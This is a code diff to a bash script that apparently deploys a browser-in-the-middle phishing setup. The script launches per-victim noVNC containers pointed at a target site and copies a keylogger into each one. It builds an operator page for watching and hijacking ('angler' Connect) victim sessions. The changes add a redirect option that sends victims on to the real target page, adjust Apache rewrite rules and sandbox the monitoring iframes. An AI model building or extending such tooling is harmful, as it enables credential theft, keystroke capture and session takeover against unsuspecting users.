@@ -13,10 +13,11 @@
 	   echo -e "\t -k Full path to the key file of the ssl certificate"
 	   echo -e "\t -a Adjust default user agent string"  
 	   echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
+	   echo -e "\t -r true / false to turn on the redirection to the target page"
 	   exit 1 # Exit script after printing help
 	}
 	
-	while getopts "u:d:t:s:c:k:e:a:z:p:" opt
+	while getopts "u:d:t:s:c:k:e:a:z:p:r:" opt
 	do
 		case "$opt" in
 		u ) User="$OPTARG" ;;
@@ -29,6 +30,7 @@
 		a ) useragent=$OPTARG ;;
 		z ) rzip=$OPTARG ;;
 		p ) param=$OPTARG ;;
+		r ) Redirect=$OPTARG ;;
 		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
 		esac
 	done
@@ -118,8 +120,8 @@ case "$1" in
 		echo '
 		RewriteEngine On
     		RewriteMap redirects txt:/tmp/redirects.txt
-    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
-    		RewriteRule ^ ${C:1}? [R=302]
+		RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
+		RewriteRule ^(.*)$ ${redirects:$1} [R,L]
     		
     		<Location /status.php>
 		    Deny from all
@@ -130,8 +132,8 @@ case "$1" in
 		echo '
 		RewriteEngine On
     		RewriteMap redirects txt:/tmp/redirects.txt
-    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
-    		RewriteRule ^ ${C:1}? [R=302]
+		RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
+		RewriteRule ^(.*)$ ${redirects:$1} [R,L]
 		
 		<Location /status.php>
 		    Deny from all
@@ -320,6 +322,9 @@ case "$1" in
     <div class="iframe-container">
 	' > ./output/status.php
         
+        
+        
+        
 	declare -a urls=()
 	printf "[-] Starting containers \033[0K\r\n"  
 	for (( c=$START; c<=$END; c++ ))
@@ -366,10 +371,23 @@ case "$1" in
 	    	sudo docker cp ./novnc.ico vnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
 	    	
 	    fi
-	    
+
+
+	
 	    # Replace TARGET_URL placeholder with actual target inside vnc/ui.js
-            sudo docker cp ./vnc/ui.js vnc-user$c:/usr/libexec/noVNCdim/app/
-            sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
+	    if [ -n "$Redirect" ]
+	    then
+	    	RedirectTarget=$Target
+	    	sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
+	    else
+	    	RedirectTarget="/"
+	    	if [ -n "$SSL" ]
+	    	then
+	    		sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    	else
+	    		sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    	fi
+	    fi
 	    
 	    # Keylogger
 	    sudo docker cp ./vnc/logger.py vnc-user$c:/home/headless/   
@@ -487,14 +505,14 @@ case "$1" in
 	    then
 		echo "
 		    <div class='iframe-wrapper'>
-		      <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+		      <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
 		      <!-- Form for file creation -->
 		      <form method='post'>
 			<!-- Buttons inside the wrapper -->
 			<div class='iframe-buttons'>
 			  <a class='iframe-button' href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
-			  <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
-			  <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
+			  <input type='hidden' name='file_content' value='/$PW/websockify $RedirectTarget'>
+			  <input type='hidden' name='file_content2' value='/$PW/conn.html $RedirectTarget'>
 			  <input type='hidden' name='ip_value' value='$CIP'>
 			  <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
 			  <a class='iframe-button' href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
@@ -511,14 +529,14 @@ case "$1" in
 	    else
 		echo "
 		    <div class='iframe-wrapper'>
-		      <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+		      <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
 		      <!-- Form for file creation -->
 		      <form method='post'>
 			<!-- Buttons inside the wrapper -->
 			<div class='iframe-buttons'>
 			  <a class='iframe-button' href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
-			  <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
-			  <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
+			  <input type='hidden' name='file_content' value='/$PW/websockify $RedirectTarget'>
+			  <input type='hidden' name='file_content2' value='/$PW/conn.html $RedirectTarget'>
 			  <input type='hidden' name='ip_value' value='$CIP'>
 			  <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
 			  <a class='iframe-button' href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
